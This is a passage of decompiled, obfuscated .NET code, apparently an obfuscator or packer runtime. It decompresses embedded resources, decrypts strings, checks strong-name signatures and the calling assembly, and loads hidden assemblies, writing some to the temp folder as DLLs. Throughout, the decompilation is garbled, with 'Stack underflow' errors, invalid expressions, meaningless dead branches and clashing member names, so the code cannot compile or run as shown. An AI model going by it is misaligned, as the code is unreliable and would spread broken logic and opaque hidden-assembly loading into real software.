								global::_0003._0004._0005._0002 = (int[])/*Error near IL_002c: Stack underflow*/;
								if (false)
								{
									continue;
								}
								num = 19;
							}
							if (num != 0)
							{
								RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
								_0003 = (int[])/*Error near IL_0046: Stack underflow*/;
								return;
							}
							goto IL_0001;
						}
						break;
					}
				}
			}
		}

		internal sealed class _0006
		{
			private static readonly int[] _0001;

			internal static readonly byte[] _0001;

			private static readonly short[] _0001;

			private static readonly byte[] _0002;

			private static readonly short[] _0002;

			private static readonly byte[] _0003;

			static _0006()
			{
				//IL_0068: Unknown result type (might be due to invalid IL or missing references)
				//IL_006a: Unknown result type (might be due to invalid IL or missing references)
				//IL_008e: Invalid comparison between Unknown and I4
				//IL_0175: Incompatible stack heights: 0 vs 1
				//IL_017f: Incompatible stack heights: 0 vs 1
				//IL_018b: Incompatible stack heights: 0 vs 2
				//IL_0191: Incompatible stack heights: 0 vs 2
				//IL_019b: Expected I4, but got Unknown
				//IL_019b: Incompatible stack heights: 0 vs 1
				//IL_01a1: Incompatible stack heights: 0 vs 2
				//IL_01a7: Incompatible stack heights: 0 vs 1
				//IL_01ad: Incompatible stack heights: 0 vs 2
				while (true)
				{
					_ = new int[19]
					{
						16, 17, 18, 0, 8, 7, 9, 6, 10, 5,
						11, 4, 12, 3, 13, 2, 14, 1, 15
					};
					_0006._0001 = (int[])/*Error near IL_0017: Stack underflow*/;
					while (true)
					{
						IL_0017:
						_ = new byte[16]
						{
							0, 8, 4, 12, 2, 10, 6, 14, 1, 9,
							5, 13, 3, 11, 7, 15
						};
						_0006._0001 = (byte[])/*Error near IL_002e: Stack underflow*/;
						_0001 = new short[286];
						_0006._0002 = new byte[286];
						int num;
						if (0 == 0)
						{
							num = 0;
							goto IL_0089;
						}
						goto IL_00ab;
						IL_0089:
						if ((int)/*Error near IL_0090: Stack underflow*/ < 144)
						{
							_ = _0001;
							_ = 48;
							global::_0002._0006._0001(/*Error near IL_0069: Stack underflow*/ + /*Error near IL_0069: Stack underflow*/<< 8);
							((short[])/*Error near IL_0071: Stack underflow*/)[/*Error near IL_0071: Stack underflow*/] = (short)/*Error near IL_0071: Stack underflow*/;
							goto IL_0071;
						}
						goto IL_00b8;
						IL_00ab:
						_0006._0002[num++] = 9;
						goto IL_00b8;
						IL_00b8:
						if (num < 256)
						{
							_ = _0001;
							short num2 = global::_0002._0006._0001(256 + num << 7);
							((short[])/*Error near IL_00ab: Stack underflow*/)[/*Error near IL_00ab: Stack underflow*/] = num2;
							goto IL_00ab;
						}
						if (false)
						{
							break;
						}
						while (true)
						{
							int num3 = num;
							while (num3 >= 280)
							{
								while (num < 286)
								{
									_0001[num] = global::_0002._0006._0001(-88 + num << 8);
									_0006._0002[num++] = 8;
								}
								_0002 = new short[30];
								_0003 = new byte[30];
								if (false)
								{
									goto end_IL_00f0;
								}
								num = 0;
								while (true)
								{
									if (num < 30)
									{
										_0002[num] = global::_0002._0006._0001(num << 11);
										if (2 == 0)
										{
											break;
										}
										_0003[num] = 5;
										num3 = num;
										if (3 == 0)
										{
											goto IL_00f1;
										}
										num = num3 + 1;
										continue;
									}
									return;
								}
								goto IL_0017;
								IL_00f1:;
							}
							_0001[num] = global::_0002._0006._0001(-256 + num << 9);
							if (7 == 0)
							{
								goto end_IL_0017;
							}
							_0006._0002[num++] = 7;
							continue;
							end_IL_00f0:
							break;
						}
						goto IL_0071;
						IL_0071:
						if (0 == 0)
						{
							_ = _0006._0002;
							num++;
							((sbyte[])/*Error near IL_0084: Stack underflow*/)[/*Error near IL_0084: Stack underflow*/] = 8;
							goto IL_0089;
						}
						goto IL_00b8;
						continue;
						end_IL_0017:
						break;
					}
				}
			}
		}

		internal sealed class _0007 : MemoryStream
		{
			public _0007(byte[] P_0)
				: base(P_0, writable: false)
			{
			}
		}
	}
}
namespace _0002
{
	internal sealed class _0006
	{
		[NonSerialized]
		internal static GetString _009B;

		unsafe static int _0001(global::_0003._0004._0002 P_0, byte[] P_1, int P_2, int P_3)
		{
			//IL_0108: Incompatible stack heights: 0 vs 1
			//IL_010e: Incompatible stack heights: 0 vs 1
			//IL_0115: Incompatible stack heights: 0 vs 1
			//IL_011b: Incompatible stack heights: 0 vs 1
			//IL_0121: Incompatible stack heights: 0 vs 1
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_012d: Incompatible stack heights: 0 vs 1
			//IL_0133: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[12];
			*(int*)(nint)/*Error near IL_0011: Stack underflow*/ = 0;
			while (P_0._0003 > 0 && P_3 > 0)
			{
				P_2++;
				uint num = ((global::_0003._0004._0002)/*Error near IL_002b: Stack underflow*/)._0001;
				((sbyte[])/*Error near IL_002d: Stack underflow*/)[/*Error near IL_002d: Stack underflow*/] = (sbyte)(byte)num;
				uint num2 = ((global::_0003._0004._0002)/*Error near IL_003c: Stack underflow*/)._0001;
				((global::_0003._0004._0002)/*Error near IL_0043: Stack underflow*/)._0001 = num2 >> 8;
				int num3 = ((global::_0003._0004._0002)/*Error near IL_0052: Stack underflow*/)._0003;
				((global::_0003._0004._0002)/*Error near IL_0059: Stack underflow*/)._0003 = num3 - 8;
				P_3--;
				(*(int*)ptr)++;
			}
			if (P_3 == 0)
			{
				return *(int*)ptr;
			}
			*(int*)((byte*)ptr + 4) = P_0._0002 - P_0._0001;
			if (P_3 > *(int*)((byte*)ptr + 4))
			{
				P_3 = *(int*)((byte*)ptr + 4);
			}
			Array.Copy(P_0._0001, P_0._0001, P_1, P_2, P_3);
			P_0._0001 += P_3;
			if (((uint)(P_0._0001 - P_0._0002) & (true ? 1u : 0u)) != 0)
			{
				byte[] array = P_0._0001;
				*(int*)((byte*)ptr + 8) = P_0._0001;
				P_0._0001 = *(int*)((byte*)ptr + 8) + 1;
				P_0._0001 = array[*(int*)((byte*)ptr + 8)] & 0xFFu;
				P_0._0003 = 8;
			}
			return *(int*)ptr + P_3;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0003._0004._0004 _0001(global::_0003._0004._0005 P_0)
		{
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((global::_0003._0004._0005)/*Error near IL_0007: Stack underflow*/)._0003];
			_ = ((global::_0003._0004._0005)/*Error near IL_0015: Stack underflow*/)._0002;
			_ = ((global::_0003._0004._0005)/*Error near IL_001c: Stack underflow*/)._0002;
			_ = 0;
			Array.Copy(length: ((global::_0003._0004._0005)/*Error near IL_0026: Stack underflow*/)._0003, sourceArray: (Array)/*Error near IL_0044: Stack underflow*/, sourceIndex: (int)/*Error near IL_0044: Stack underflow*/, destinationArray: (Array)/*Error near IL_0044: Stack underflow*/, destinationIndex: (int)/*Error near IL_0044: Stack underflow*/);
			new global::_0003._0004._0004((byte[])/*Error near IL_004e: Stack underflow*/);
			return (global::_0003._0004._0004)/*Error near IL_002d: Stack underflow*/;
		}

		static void _0001(global::_0003._0004._0003 P_0, int P_1, int P_2)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I4, but got Unknown
			//IL_001c: Expected I4, but got Unknown
			//IL_0026: Invalid comparison between Unknown and I4
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0043: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_0055: Expected I4, but got Unknown
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 2
			//IL_00d9: Incompatible stack heights: 0 vs 1
			//IL_00e3: Incompatible stack heights: 0 vs 1
			//IL_00e9: Incompatible stack heights: 0 vs 1
			//IL_00ef: Incompatible stack heights: 0 vs 2
			//IL_00f5: Expected I4, but got Unknown
			//IL_00fb: Incompatible stack heights: 0 vs 2
			_ = ((global::_0003._0004._0003)/*Error near IL_000f: Stack underflow*/)._0002;
			_003F val = /*Error near IL_0015: Stack underflow*/+ /*Error near IL_0015: Stack underflow*/;
			int num = (int)val;
			((global::_0003._0004._0003)/*Error near IL_001c: Stack underflow*/)._0002 = (int)val;
			if ((int)/*Error near IL_0028: Stack underflow*/ > 32768)
			{
				new InvalidOperationException();
				throw /*Error near IL_002e: Stack underflow*/;
			}
			_ = ((global::_0003._0004._0003)/*Error near IL_0038: Stack underflow*/)._0001;
			int num2 = (/*Error near IL_003e: Stack underflow*/ - /*Error near IL_003e: Stack underflow*/) & 0x7FFF;
			_ = 32768;
			int num3 = /*Error near IL_0054: Stack underflow*/- /*Error near IL_0054: Stack underflow*/;
			if (num2 <= num3 && P_0._0001 < num3)
			{
				if (P_1 <= P_2)
				{
					Array.Copy(P_0._0001, num2, P_0._0001, P_0._0001, P_1);
					P_0._0001 += P_1;
				}
				else
				{
					while (P_1-- > 0)
					{
						P_0._0001[P_0._0001++] = P_0._0001[num2++];
					}
				}
			}
			else
			{
				_0006._0001(P_0, num2, P_1, P_2);
			}
		}

		static void _0001(global::_0003._0004._0003 P_0, int P_1)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected I4, but got Unknown
			//IL_0027: Invalid comparison between Unknown and I4
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 1
			//IL_007b: Incompatible stack heights: 0 vs 1
			//IL_0081: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_008b: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 2
			//IL_0091: Incompatible stack heights: 0 vs 1
			while (true)
			{
				int num = ((global::_0003._0004._0003)/*Error near IL_000c: Stack underflow*/)._0002;
				_003F val = /*Error near IL_0018: Stack underflow*/+ 1;
				((global::_0003._0004._0003)/*Error near IL_001d: Stack underflow*/)._0002 = (int)val;
				while (0 == 0)
				{
					if ((int)/*Error near IL_0029: Stack underflow*/ != 32768)
					{
						if (8 == 0)
						{
							break;
						}
						_ = ((global::_0003._0004._0003)/*Error near IL_0039: Stack underflow*/)._0001;
						num = ((global::_0003._0004._0003)/*Error near IL_0042: Stack underflow*/)._0001;
						((global::_0003._0004._0003)/*Error near IL_004b: Stack underflow*/)._0001 = num + 1;
						((sbyte[])/*Error near IL_004f: Stack underflow*/)[num] = (sbyte)(byte)P_1;
						if (0 == 0)
						{
							if (0 == 0)
							{
								P_0._0001 &= 32767;
								return;
							}
							continue;
						}
					}
					if (8 == 0)
					{
						break;
					}
					new InvalidOperationException();
					throw /*Error near IL_002f: Stack underflow*/;
				}
			}
		}

		unsafe static bool _0001(global::_0003._0004._0001 P_0)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_0221: Incompatible stack heights: 0 vs 1
			//IL_0227: Incompatible stack heights: 0 vs 2
			//IL_022d: Incompatible stack heights: 0 vs 1
			//IL_0233: Incompatible stack heights: 0 vs 1
			//IL_0239: Incompatible stack heights: 0 vs 1
			//IL_023f: Incompatible stack heights: 0 vs 1
			//IL_0245: Incompatible stack heights: 0 vs 1
			//IL_024f: Incompatible stack heights: 0 vs 1
			int num = 12;
			if (num == 0)
			{
				goto IL_00ca;
			}
			void* ptr = stackalloc byte[num];
			_ = /*Error near IL_0017: Stack underflow*/+ 4;
			int num2 = ((global::_0003._0004._0001)/*Error near IL_0021: Stack underflow*/)._0001;
			*(int*)(nint)/*Error near IL_0022: Stack underflow*/ = num2;
			int num6 = default(int);
			while (true)
			{
				int num3;
				int num4;
				switch (*(int*)(nint)(/*Error near IL_0029: Stack underflow*/ + 4))
				{
				case 2:
					num3 = (((global::_0003._0004._0001)/*Error near IL_006c: Stack underflow*/)._0001 ? 1 : 0);
					if (0 == 0)
					{
						goto IL_0072;
					}
					goto IL_0219;
				case 3:
					num4 = (P_0._0005 = _0006._0001(P_0._0001, 16));
					goto IL_013d;
				case 4:
					num4 = _0006._0001(P_0._0001, 16);
					if (false)
					{
						goto IL_013d;
					}
					goto IL_0166;
				case 5:
					break;
				case 6:
					if (!_0006._0001(P_0._0001, P_0._0001))
					{
						return false;
					}
					P_0._0001 = _0006._0001(P_0._0001);
					P_0._0002 = _0006._0001(P_0._0001);
					P_0._0001 = 7;
					goto case 7;
				case 7:
				case 8:
				case 9:
				case 10:
					return _0006._0001(P_0);
				case 12:
					goto end_IL_0027;
				default:
					{
						num3 = 0;
						goto IL_0219;
					}
					IL_0219:
					return (byte)num3 != 0;
					IL_013d:
					if (num4 < 0)
					{
						return false;
					}
					_0006._0001(P_0._0001, 16);
					P_0._0001 = 4;
					goto case 4;
				}
				goto IL_017f;
				IL_0166:
				if (num4 < 0)
				{
					return false;
				}
				_0006._0001(P_0._0001, 16);
				P_0._0001 = 5;
				goto IL_017f;
				IL_0072:
				if (num3 != 0)
				{
					((global::_0003._0004._0001)/*Error near IL_0080: Stack underflow*/)._0001 = 12;
					return false;
				}
				_0006._0001(((global::_0003._0004._0001)/*Error near IL_0091: Stack underflow*/)._0001, 3);
				*(_003F*)(nint)/*Error near IL_0098: Stack underflow*/ = /*Error near IL_0098: Stack underflow*/;
				if (*(int*)ptr < 0)
				{
					return false;
				}
				_0006._0001(P_0._0001, 3);
				int num5 = *(int*)ptr;
				if (8u != 0)
				{
					if (((uint)num5 & (true ? 1u : 0u)) != 0)
					{
						if (7 == 0)
						{
							continue;
						}
						P_0._0001 = true;
					}
					num6 = *(int*)ptr >> 1;
					goto IL_00c9;
				}
				goto IL_01b1;
				IL_01b1:
				if (num5 == 0)
				{
					P_0._0001 = 2;
					return true;
				}
				return !_0006._0001(P_0._0001);
				IL_017f:
				*(int*)((byte*)ptr + 8) = _0006._0001(P_0._0001, P_0._0001, P_0._0005);
				P_0._0005 -= *(int*)((byte*)ptr + 8);
				num5 = P_0._0005;
				goto IL_01b1;
				continue;
				end_IL_0027:
				break;
			}
			if (5 == 0)
			{
				goto IL_0125;
			}
			return false;
			IL_0125:
			return true;
			IL_00ca:
			switch (num)
			{
			case 0:
				break;
			case 1:
				P_0._0001 = global::_0003._0004._0004._0001;
				P_0._0002 = global::_0003._0004._0004._0002;
				P_0._0001 = 7;
				goto IL_0125;
			case 2:
				P_0._0001 = new global::_0003._0004._0005();
				P_0._0001 = 6;
				goto IL_0125;
			default:
				goto IL_0125;
			}
			_0006._0001(P_0._0001);
			if (1 == 0)
			{
				goto IL_00c9;
			}
			P_0._0001 = 3;
			goto IL_0125;
			IL_00c9:
			num = num6;
			goto IL_00ca;
		}

		unsafe static Assembly _0001(object _0002, ResolveEventArgs _0003)
		{
			//IL_0294: Incompatible stack heights: 0 vs 2
			//IL_029e: Incompatible stack heights: 0 vs 1
			//IL_02b2: Incompatible stack heights: 0 vs 1
			//IL_02c2: Incompatible stack heights: 0 vs 1
			//IL_02c8: Incompatible stack heights: 0 vs 1
			//IL_02d2: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[16];
			global::_0003._0002._0001 obj = default(global::_0003._0002._0001);
			_ = ref obj;
			_ = ((ResolveEventArgs)/*Error near IL_029e: Stack underflow*/).Name;
			*(global::_0003._0002._0001*)/*Error near IL_02a8: Stack underflow*/ = new global::_0003._0002._0001((string)/*Error near IL_02a8: Stack underflow*/);
			string text3;
			bool flag;
			bool flag2;
			while (true)
			{
				obj._0001(_0002: false);
				string text = (string)/*Error near IL_02b8: Stack underflow*/;
				_ = Encoding.UTF8;
				((Encoding)/*Error near IL_02d2: Stack underflow*/).GetBytes((string)/*Error near IL_02d2: Stack underflow*/);
				string text2 = Convert.ToBase64String((byte[])/*Error near IL_003c: Stack underflow*/);
				string[] array = "ezE5N2FkYTM1LWNlYzItNGRiNy05NTRlLTljNmFkY2ExMGE3NH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{0112f0f1-7fa5-45b2-9e87-4244c70e9ea3},ezE5N2FkYTM1LWNlYzItNGRiNy05NTRlLTljNmFkY2ExMGE3NH0=,[z]{0112f0f1-7fa5-45b2-9e87-4244c70e9ea3}".Split(new char[1] { ',' });
				text3 = string.Empty;
				flag = false;
				flag2 = false;
				*(int*)ptr = 0;
				while (*(int*)ptr < array.Length - 1)
				{
					if (array[*(int*)ptr] == text2)
					{
						text3 = array[*(int*)ptr + 1];
						break;
					}
					*(int*)ptr += 2;
				}
				if (text3.Length != 0 || obj._0003.Length != 0)
				{
					break;
				}
				text2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj._0001));
				*(int*)((byte*)ptr + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < array.Length - 1)
				{
					if (!(array[*(int*)((byte*)ptr + 4)] == text2))
					{
						*(int*)((byte*)ptr + 4) += 2;
						continue;
					}
					goto IL_00d0;
				}
				break;
				IL_00d0:
				if (0 == 0)
				{
					text3 = array[*(int*)((byte*)ptr + 4) + 1];
					break;
				}
			}
			if (text3.Length > 0)
			{
				if (text3[0] == '[')
				{
					*(int*)((byte*)ptr + 8) = text3.IndexOf(']');
					string text4 = text3.Substring(1, *(int*)((byte*)ptr + 8) - 1);
					flag = text4.IndexOf('z') >= 0;
					flag2 = text4.IndexOf('t') >= 0;
					text3 = text3.Substring(*(int*)((byte*)ptr + 8) + 1);
				}
				lock (global::_0003._0002._0001)
				{
					if (global::_0003._0002._0001.ContainsKey(text3))
					{
						return global::_0003._0002._0001[text3];
					}
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text3);
					if (manifestResourceStream != null)
					{
						*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
						byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
						manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
						if (flag)
						{
							array2 = _0006._0001(array2);
						}
						Assembly assembly = null;
						if (!flag2)
						{
							try
							{
								assembly = Assembly.Load(array2);
							}
							catch (FileLoadException)
							{
								flag2 = true;
							}
							catch (BadImageFormatException)
							{
								flag2 = true;
							}
						}
						if (flag2)
						{
							try
							{
								string text5 = $"{Path.GetTempPath()}{text3}\\";
								Directory.CreateDirectory(text5);
								string text6 = text5 + obj._0001 + ".dll";
								if (!File.Exists(text6))
								{
									FileStream fileStream = File.OpenWrite(text6);
									fileStream.Write(array2, 0, array2.Length);
									fileStream.Close();
									_0006._0001(text6, (string)null, 4);
									_0006._0001(text5, (string)null, 4);
								}
								assembly = Assembly.LoadFile(text6);
							}
							catch
							{
							}
						}
						global::_0003._0002._0001[text3] = assembly;
						return assembly;
					}
				}
			}
			return null;
		}

		unsafe static bool _0001(global::_0003._0004._0005 P_0, global::_0003._0004._0002 P_1)
		{
			//IL_02a3: Incompatible stack heights: 0 vs 1
			//IL_02a9: Incompatible stack heights: 0 vs 1
			//IL_02af: Incompatible stack heights: 0 vs 1
			//IL_02b5: Incompatible stack heights: 0 vs 1
			//IL_02bb: Incompatible stack heights: 0 vs 1
			//IL_02c5: Incompatible stack heights: 0 vs 1
			//IL_02cb: Incompatible stack heights: 0 vs 1
			//IL_02d1: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[16];
			while (true)
			{
				int num = ((global::_0003._0004._0005)/*Error near IL_0019: Stack underflow*/)._0001;
				*(int*)(nint)/*Error near IL_001a: Stack underflow*/ = num;
				switch (*(int*)(nint)/*Error near IL_0020: Stack underflow*/)
				{
				default:
					continue;
				case 0:
				{
					_0006._0001((global::_0003._0004._0002)/*Error near IL_02c5: Stack underflow*/, 5);
					((global::_0003._0004._0005)/*Error near IL_0054: Stack underflow*/)._0002 = (int)/*Error near IL_0054: Stack underflow*/;
					if (((global::_0003._0004._0005)/*Error near IL_005e: Stack underflow*/)._0002 < 0)
					{
						return false;
					}
					int num2 = P_0._0002;
					((global::_0003._0004._0005)/*Error near IL_0079: Stack underflow*/)._0002 = num2 + 257;
					_0006._0001(P_1, 5);
					P_0._0001 = 1;
					goto case 1;
				}
				case 1:
					P_0._0003 = _0006._0001(P_1, 5);
					if (P_0._0003 < 0)
					{
						return false;
					}
					P_0._0003++;
					_0006._0001(P_1, 5);
					P_0._0005 = P_0._0002 + P_0._0003;
					P_0._0002 = new byte[P_0._0005];
					P_0._0001 = 2;
					goto case 2;
				case 2:
					P_0._0004 = _0006._0001(P_1, 4);
					if (P_0._0004 < 0)
					{
						return false;
					}
					P_0._0004 += 4;
					_0006._0001(P_1, 4);
					P_0._0001 = new byte[19];
					P_0._0007 = 0;
					P_0._0001 = 3;
					goto case 3;
				case 3:
					while (P_0._0007 < P_0._0004)
					{
						*(int*)((byte*)ptr + 4) = _0006._0001(P_1, 3);
						if (*(int*)((byte*)ptr + 4) < 0)
						{
							return false;
						}
						_0006._0001(P_1, 3);
						P_0._0001[global::_0003._0004._0005._0003[P_0._0007]] = (byte)(*(uint*)((byte*)ptr + 4));
						P_0._0007++;
					}
					P_0._0001 = new global::_0003._0004._0004(P_0._0001);
					P_0._0001 = null;
					P_0._0007 = 0;
					P_0._0001 = 4;
					goto case 4;
				case 4:
				{
					int num3;
					while (((num3 = _0006._0001(P_0._0001, P_1)) & -16) == 0)
					{
						byte[] array = P_0._0002;
						*(int*)((byte*)ptr + 8) = P_0._0007;
						P_0._0007 = *(int*)((byte*)ptr + 8) + 1;
						array[*(int*)((byte*)ptr + 8)] = (P_0._0001 = (byte)num3);
						if (P_0._0007 == P_0._0005)
						{
							return true;
						}
					}
					if (num3 < 0)
					{
						return false;
					}
					if (num3 >= 17)
					{
						P_0._0001 = 0;
					}
					P_0._0006 = num3 - 16;
					P_0._0001 = 5;
					break;
				}
				case 5:
					break;
				}
				*(int*)((byte*)ptr + 12) = global::_0003._0004._0005._0002[P_0._0006];
				int num4 = _0006._0001(P_1, *(int*)((byte*)ptr + 12));
				if (num4 < 0)
				{
					return false;
				}
				_0006._0001(P_1, *(int*)((byte*)ptr + 12));
				num4 += global::_0003._0004._0005._0001[P_0._0006];
				while (num4-- > 0)
				{
					byte[] array2 = P_0._0002;
					*(int*)((byte*)ptr + 8) = P_0._0007;
					P_0._0007 = *(int*)((byte*)ptr + 8) + 1;
					array2[*(int*)((byte*)ptr + 8)] = P_0._0001;
				}
				if (P_0._0007 == P_0._0005)
				{
					break;
				}
				P_0._0001 = 4;
			}
			return true;
		}

		static int _0001(global::_0003._0004._0003 P_0)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected I4, but got Unknown
			//IL_000f: Incompatible stack heights: 0 vs 2
			_ = 32768;
			int num = ((global::_0003._0004._0003)/*Error near IL_000c: Stack underflow*/)._0002;
			return /*Error near IL_000d: Stack underflow*/- num;
		}

		static global::_0003._0004._0004 _0001(global::_0003._0004._0005 P_0)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 3
			//IL_0034: Incompatible stack heights: 0 vs 2
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((global::_0003._0004._0005)/*Error near IL_0007: Stack underflow*/)._0002];
			_ = ((global::_0003._0004._0005)/*Error near IL_0015: Stack underflow*/)._0002;
			_ = 0;
			_ = 0;
			Array.Copy(length: ((global::_0003._0004._0005)/*Error near IL_0020: Stack underflow*/)._0002, sourceArray: (Array)/*Error near IL_003b: Stack underflow*/, sourceIndex: (int)/*Error near IL_003b: Stack underflow*/, destinationArray: (Array)/*Error near IL_003b: Stack underflow*/, destinationIndex: (int)/*Error near IL_003b: Stack underflow*/);
			new global::_0003._0004._0004((byte[])/*Error near IL_0045: Stack underflow*/);
			return (global::_0003._0004._0004)/*Error near IL_0027: Stack underflow*/;
		}

		static int _0001(global::_0003._0004._0007 P_0)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected I4, but got Unknown
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			_0006._0001((global::_0003._0004._0007)/*Error near IL_0015: Stack underflow*/);
			_0006._0001((global::_0003._0004._0007)/*Error near IL_001f: Stack underflow*/);
			_003F val = /*Error near IL_000b: Stack underflow*/<< 16;
			return /*Error near IL_000c: Stack underflow*/| val;
		}

		static void _0001(AppDomain _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			ResolveEventHandler value = _0006._0001;
			((AppDomain)/*Error near IL_0019: Stack underflow*/).AssemblyResolve += value;
		}

		static byte[] _0001()
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0084._007E_0099;
			_0006._0001();
			_009B(107396396);
			CultureInfo cultureInfo = _0001._0001;
			/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, cultureInfo);
			return (byte[])/*Error near IL_001b: Stack underflow*/;
		}

		static string _0001(int P_0)
		{
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_004a: Incompatible stack heights: 1 vs 0
			//IL_0114: Incompatible stack heights: 0 vs 1
			//IL_012c: Incompatible stack heights: 0 vs 1
			//IL_0132: Incompatible stack heights: 0 vs 1
			//IL_013e: Incompatible stack heights: 0 vs 1
			//IL_0144: Incompatible stack heights: 0 vs 1
			int num = (int)/*Error near IL_011a: Stack underflow*/;
			byte[] array = global::_0006._0002._0001;
			int num2 = num;
			int num3 = num2 + 1;
			if (0 == 0)
			{
				num = num3;
			}
			int num4 = array[num2];
			int num6;
			while (true)
			{
				int num5 = num4;
				if ((/*Error near IL_002b: Stack underflow*/ & 0x80) == 0)
				{
					num6 = (int)/*Error near IL_0138: Stack underflow*/;
					if ((int)/*Error near IL_003e: Stack underflow*/ != 0)
					{
						break;
					}
					return string.Empty;
				}
				if (-1 == 0)
				{
					continue;
				}
				int num8;
				if (7u != 0)
				{
					int num7 = num4 & 0x40;
					while (num7 != 0)
					{
						num8 = ((num5 & 0x1F) << 24) + (global::_0006._0002._0001[num++] << 16);
						while (true)
						{
							num7 = num8 + (global::_0006._0002._0001[num++] << 8);
							if (false)
							{
								break;
							}
							num8 = num7 + global::_0006._0002._0001[num++];
							if (false)
							{
								continue;
							}
							goto IL_00a2;
						}
					}
					int num9 = num5 & 0x3F;
					int num10 = 8;
					do
					{
						num9 <<= num10;
						num10 = global::_0006._0002._0001[num++];
					}
					while (false);
					num4 = num9 + num10;
				}
				num6 = num4;
				break;
				IL_00a2:
				num6 = num8;
				break;
			}
			while (false)
			{
			}
			try
			{
				byte[] array2 = _0087._009B(_0086._007E_009A(_0012._0018(), global::_0006._0002._0001, num, num6));
				string text = _0088._009C(_0086._007E_009A(_0012._0018(), array2, 0, array2.Length));
				if (global::_0006._0002._0001)
				{
					_0006._0001(P_0, text);
				}
				return text;
			}
			catch
			{
				string result;
				do
				{
					result = null;
				}
				while (false);
				return result;
			}
		}

		static Bitmap _0001()
		{
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0084._007E_0099;
			_0006._0001();
			_009B(107396347);
			CultureInfo cultureInfo = _0001._0001;
			/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, cultureInfo);
			return (Bitmap)/*Error near IL_001b: Stack underflow*/;
		}

		unsafe static byte[] _0001(byte[] P_0)
		{
			//IL_0320: Incompatible stack heights: 0 vs 1
			//IL_0330: Incompatible stack heights: 0 vs 1
			//IL_033c: Incompatible stack heights: 0 vs 1
			//IL_0342: Incompatible stack heights: 0 vs 1
			//IL_0348: Incompatible stack heights: 0 vs 1
			//IL_034e: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[46];
			Assembly.GetCallingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_0326: Stack underflow*/;
			Assembly.GetExecutingAssembly();
			Assembly assembly2 = (Assembly)/*Error near IL_0336: Stack underflow*/;
			if (/*Error near IL_002a: Stack underflow*/ != /*Error near IL_002a: Stack underflow*/&& !_0006._0001((Assembly)/*Error near IL_0039: Stack underflow*/, (Assembly)/*Error near IL_0039: Stack underflow*/))
			{
				return null;
			}
			global::_0003._0004._0007 obj = new global::_0003._0004._0007(P_0);
			byte[] array = new byte[0];
			*(int*)ptr = _0006._0001(obj);
			int num = *(int*)ptr;
			if (6 == 0)
			{
				goto IL_0226;
			}
			if (num == 67324752)
			{
				*(short*)((byte*)ptr + 44) = (short)_0006._0001(obj);
